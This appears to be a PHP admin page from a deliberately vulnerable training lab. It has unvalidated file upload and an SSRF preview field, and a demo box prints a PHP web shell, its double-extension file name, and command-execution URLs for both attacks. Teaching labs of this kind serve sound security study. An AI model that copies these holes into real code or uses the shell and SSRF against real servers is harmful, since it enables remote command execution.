<?php
require_once '../config.inc';

if (!isset($_SESSION['is_admin']) || !$_SESSION['is_admin']) {
    die("Access denied!");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ¡VULNERABILIDAD: File Upload sin validación adecuada!
    if (isset($_FILES['product_image'])) {
        $uploaded = uploadImage($_FILES['product_image']);
        
        if ($uploaded) {
            echo "File uploaded: <a href='$uploaded'>$uploaded</a>";
            
            // ¡VULNERABILIDAD: SSRF a admin_service!
            if (isset($_POST['preview_url'])) {
                $url = $_POST['preview_url'];
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                echo "<pre>Preview response: $response</pre>";
            }
        } else {
            echo "Upload failed!";
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Upload Product - Admin Panel</title>
</head>
<body>
    <h1>Upload Product Image</h1>
    
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="product_image" required><br><br>
        <input type="text" name="preview_url" placeholder="Preview URL (optional)"><br><br>
        <input type="submit" value="Upload">
    </form>
    
    <div style="background: #ffcccc; padding: 15px; margin-top: 20px;">
        <h3>⚠️ File Upload Vulnerability Demo</h3>
        <p>Upload a file with PHP code:</p>
        <pre>
&lt;?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?&gt;
        </pre>
        <p>Save as: shell.jpg.php</p>
        <p>Access at: /uploads/shell.jpg.php?cmd=whoami</p>
        
        <h4>SSRF to Admin Service:</h4>
        <p>Preview URL: http://admin_service:5000/execute?cmd=ls</p>
    </div>
</body>
</html>